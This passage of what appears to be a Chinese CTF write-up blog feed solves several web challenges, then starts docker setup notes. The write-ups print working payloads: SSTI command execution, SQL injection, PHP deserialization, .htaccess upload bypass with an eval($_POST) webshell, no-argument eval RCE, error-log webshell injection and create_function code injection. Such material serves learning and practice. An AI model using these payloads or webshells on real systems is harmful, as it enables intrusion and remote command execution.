class="string">&#x27;SHCTF&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$$scheme</span>===<span class="string">&#x27;SHCTF&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>*<span class="number">100</span>!=<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>*<span class="number">100</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]!=<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$num</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;flag is&quot;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点：哈希拓展长度攻击，工具hashpump，下面会举例说明</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Input</span> Signature:  <span class="keyword">key</span>和明文加密后得到的哈希值</span><br><span class="line"><span class="keyword">Input</span> Data:  给出的明文</span><br><span class="line"><span class="keyword">Input</span> <span class="keyword">Key</span> <span class="keyword">Length</span>:  <span class="keyword">key</span>的长度</span><br><span class="line"><span class="keyword">Input</span> Data to <span class="keyword">Add</span>:  想要添加的数值，这部分是必须得有的，就算没用</span><br><span class="line">最后得到的结果是结合更新后内容得到的哈希值</span><br><span class="line">后面是伪造的password</span><br></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里把flag的最后一个字符&#125;当成已知的字符进行伪造新的<span class="built_in">md5</span>值，把剩下的flag当作<span class="built_in">key</span></span><br></pre></td></tr></table></figure><p>一阶段：获得flag的md5和长度，开始就是一个url拆分套娃</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231015170602470.png" alt="image-20231015170602470"></p><p>二阶段：进行md5伪造</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231015170757186.png" alt="image-20231015170757186"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传参的时候去掉最前面的&#125;，因为真正的<span class="built_in">key</span>（flag），后面是自带一个&#125;的</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?length<span class="operator">=</span><span class="variable">%80</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>P<span class="variable">%01</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>a</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">SHCTF<span class="operator">=</span>d<span class="number">285</span><span class="keyword">c</span><span class="number">0</span>becc<span class="number">667923569236</span>d<span class="number">9</span>eed<span class="number">60</span><span class="keyword">c</span><span class="number">79</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-ez-ssti">[WEEK2]ez_ssti</h2><p>ssti</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">在hackerbar随手点了个exp就getshell了</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">?name=</span><span class="template-variable">&#123;&#123;<span class="name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-EasyCMS">[WEEK2]EasyCMS</h2><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网上搜后台，<span class="literal">admin</span>/<span class="literal">admin</span>.php，密码是tao，进入后台发现可以编辑文件，直接写个马，蚁剑连接结束战斗</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">山河CTF，感谢主办方</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="比赛WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>NewStar CTF WEEK 2</title>
    <link href="https://bowuchuling.github.io/posts/1837dhw7.html"/>
    <id>https://bowuchuling.github.io/posts/1837dhw7.html</id>
    <published>2023-10-13T12:41:55.196Z</published>
    <updated>2023-10-13T12:48:36.801Z</updated>
    
    <content type="html"><![CDATA[<h1>NewStar CTF WEEK 2</h1><h2 id="游戏高手">游戏高手</h2><p>简单的JS小游戏</p><p><strong>如果你像我一样无聊，你可以尝试将飞机拉至最下方，静等flag</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013201850838.png" alt="image-20231013201850838"></p><p>找到了下面这段代码，大概就是玩够分数给你信息的意思</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013202021581.png" alt="image-20231013202021581"></p><p>这里执行在控制台进行变量定义，然后直接去送，得到flag</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013202154600.png" alt="image-20231013202154600"></p><h2 id="include-0。0">include 0。0</h2><p>源代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nope</span><br></pre></td></tr></table></figure><p>考伪协议，过滤了base和rot，这里用其他编码进行绕过</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=flag.php</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stringa</span> = <span class="string">&quot;获得的加密字符&quot;</span>;</span><br><span class="line"><span class="variable">$stringb</span> = <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$stringa</span>, <span class="string">&#x27;UCS-2LE&#x27;</span>, <span class="string">&#x27;UCS-2BE&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stringb</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ez-sql">ez_sql</h2><p>sql注入，大写绕过，列数5列，直接看出来的</p><p>爆库名</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Union</span> Select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,dataabse() --+</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unioN</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,Group_Concat(<span class="built_in">Table_nAme</span>) <span class="keyword">fRom</span> infoRmAtion_schemA.<span class="keyword">tAbles</span> <span class="keyword">whEre</span> tAble_schemA=<span class="string">&#x27;ctf&#x27;</span> #</span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Union</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,gRoup_coNcat(<span class="built_in">cOlumn_nAme</span>) <span class="keyword">fRom</span> infOrmAtion_schEma.<span class="keyword">cOlumns</span> <span class="keyword">whEre</span> <span class="built_in">tAble_Name</span>=<span class="string">&#x27;here_is_flag&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>爆内容</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Union</span> sElect <span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>,gRoup_cOncat(flag) fRom here_is_flag --+</span><br></pre></td></tr></table></figure><h2 id="Unserialize？">Unserialize？</h2><p>实例化类自动触发destruct类，利用echo触发tostring方法，进行命令执行</p><p><strong>payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;nl /th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Upload-again">Upload again!</h2><p>经过测试发现是对shell的内容进行了检查，感觉是检查了问号，文件后缀也做了过滤，php指定是传不上去了，这里使用.htaccess配置文件解析.jpg后缀进行绕过</p><p>.htaccess</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>chu0.jpg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"> <span class="built_in">eval</span>($_POST[<span class="string">&#x27;chu0&#x27;</span>]); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013203719913.png" alt="image-20231013203719913"></p><h2 id="R-C-E">R!!C!!E!!</h2><p>首先是一个.git信息泄露，用GitHack-master获取.git的内容</p><p>源码如下：bo0g1pop.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经典的无参数rce，payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(array_pop(getallheaders()));   //getall...获取请求头信息，pop出最后一个进行eval</span><br></pre></td></tr></table></figure><p>请求头添加</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ZZZsd123</span><span class="operator">=</span>phpinfo()<span class="comment">;</span></span><br><span class="line">//这里注意，请求头的首字母一定靠后，这样才能保证他是请求头的最后一个，才能被eval正确的执行</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">新手赛，感谢主办方</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="比赛WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW红包题目</title>
    <link href="https://bowuchuling.github.io/posts/1824e02a.html"/>
    <id>https://bowuchuling.github.io/posts/1824e02a.html</id>
    <published>2023-08-13T12:07:05.818Z</published>
    <updated>2023-08-13T13:24:45.460Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFSHOW红包题目"><a href="#CTFSHOW红包题目" class="headerlink" title="CTFSHOW红包题目"></a>CTFSHOW红包题目</h1><h3 id="红包7"><a href="#红包7" class="headerlink" title="红包7"></a>红包7</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(</span><br><span class="line">    <span class="string">&quot;ls &#x27;&quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]).<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是第一次见到了extract函数，百度之后知道了是一个赋值函数，主要用于变量覆盖方面</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20230813202700381.png" alt="image-20230813202700381"></p><p>大致意思就是</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们传入:</span><br><span class="line">?<span class="keyword">name</span>=<span class="keyword">value</span></span><br><span class="line">结果为：</span><br><span class="line">$<span class="keyword">name</span>=<span class="keyword">value</span></span><br><span class="line">给<span class="keyword">name</span>进行了一波赋值</span><br></pre></td></tr></table></figure><p>ini_set()函数可以对php.ini进行配置，看了wp之后知道这题是需要更改报错日志路径进而写入恶意命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1：</span><br><span class="line">?name=error_log&amp;value=/<span class="keyword">var</span>/www/html/<span class="number">1</span>.php&amp;<span class="number">1</span>=%<span class="number">00</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f*&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">这里还用到了一个技巧，系统命令可以使用%<span class="number">00</span>进行截断，进而触发报错，而报错会把所有的报错信息全部写入报错日志当中，而我们可以通过ini_set修改报错日志的储存路径，进而实现了恶意命令的写入。类似于包含日志。</span><br><span class="line">payload2：</span><br><span class="line">?name=error_log&amp;value=/<span class="keyword">var</span>/www/html/<span class="number">2</span>.php&amp;<span class="number">1</span>=%<span class="number">00</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=&#x27; | base64 -d &gt; /var/www/html/chu1.php&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="红包8"><a href="#红包8" class="headerlink" title="红包8"></a>红包8</h2><p><strong>源代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$name</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>))();</span><br></pre></td></tr></table></figure><p>这道题目主要考察的是create_function()的做法，之前接触过两个相关题目，不过都是在第二个参数上做文章，多次测试之后发现由于base64编码的限制似乎无计可施，尝试所有该编码函数的漏洞，没查到。最后一招，摇人。得到了payload，后续网上搜得到了以下博客：<a href="https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22116244642%22%2C%22source%22%3A%22m0_74044466%22%7D&amp;fromshare=blogdetail">https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22116244642%22%2C%22source%22%3A%22m0_74044466%22%7D&amp;fromshare=blogdetail</a></p><p>这里是在第一个参数上做文章，举例</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&quot;<span class="variable">$a</span>=123&quot;</span>,<span class="string">&quot;return 1;&quot;</span>)</span><br><span class="line"></span><br><span class="line">该函数处理之后将会得到以下匿名函数</span><br><span class="line"></span><br><span class="line">name1(<span class="variable">$a</span>=<span class="number">123</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">这里我们就可以在第一个参数的位置进行闭合</span><br><span class="line"><span class="keyword">name</span>=<span class="variable">$name</span>=<span class="number">123</span>)&#123;&#125;phpinfo()<span class="comment">;/*</span></span><br><span class="line">这个时候就可以执行任意php代码啦</span><br><span class="line">?<span class="keyword">name</span>=<span class="variable">$name</span>=<span class="number">123</span>)&#123;&#125;<span class="params">system</span>(<span class="string">&quot;cat /f*&quot;</span>)<span class="comment">;/*&amp;value=1</span></span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ctfshow，狠狠掐小米！</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="比赛WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>关于使用docker的一些感想，持续更新中...</title>
    <link href="https://bowuchuling.github.io/posts/7ea82466.html"/>
    <id>https://bowuchuling.github.io/posts/7ea82466.html</id>
    <published>2023-07-26T17:10:39.718Z</published>
    <updated>2023-07-28T05:43:38.450Z</updated>
    
    <content type="html"><![CDATA[<p>  docker教程其实很早就在酝酿了，但因为自己天赋不高，搞不明白，一直没有出，近期由于有出题需求，不得不又拾起vm里藏灰了的docker，又深入学习了一番，这里就不得不提到网上的各种博客，看了好长时间都看不懂，浪费了大把时间，由此被我授予了无良博客的头衔。这篇博客主要是介绍一下CTF中出题所需要的docker操作。持续更新中……</p><h2 id="docker配置教程"><a href="#docker配置教程" class="headerlink" title="docker配置教程"></a>docker配置教程</h2><h3 id="更换镜像源（阿里云）"><a href="#更换镜像源（阿里云）" class="headerlink" title="更换镜像源（阿里云）"></a>更换镜像源（阿里云）</h3><p><strong>选择性更换，如果再进行下面指令时没有报错，可以选择不更换</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/source<span class="selector-class">.list</span>   <span class="comment">//打开存源文件</span></span><br><span class="line"><span class="selector-tag">i</span>                               <span class="comment">//进入编辑模式</span></span><br><span class="line">将地址黏贴进去</span><br><span class="line">按ESC                           <span class="comment">//退出编辑模式</span></span><br><span class="line">输入:wq                         <span class="comment">//保存并退出</span></span><br></pre></td></tr></table></figure><p><strong>镜像源地址，全部复制进去</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><h3 id="创建docker"><a href="#创建docker" class="headerlink" title="创建docker"></a>创建docker</h3><p><strong>1.下载docker镜像</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt <span class="keyword">install</span> docker.io    </span><br></pre></td></tr></table></figure><p><strong>2.搜索\下载 服务器镜像</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search pull   <span class="regexp">//</span>搜索服务器镜像，可以不搜</span><br><span class="line">docker pull 镜像名    <span class="regexp">//</span>例如docker pull tutum/lamp </span><br></pre></td></tr></table></figure><p><strong>3.创建docker</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -<span class="built_in">id</span> --name 给docker取个名 -p 想开放的端口:80 服务器镜像名</span></span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> 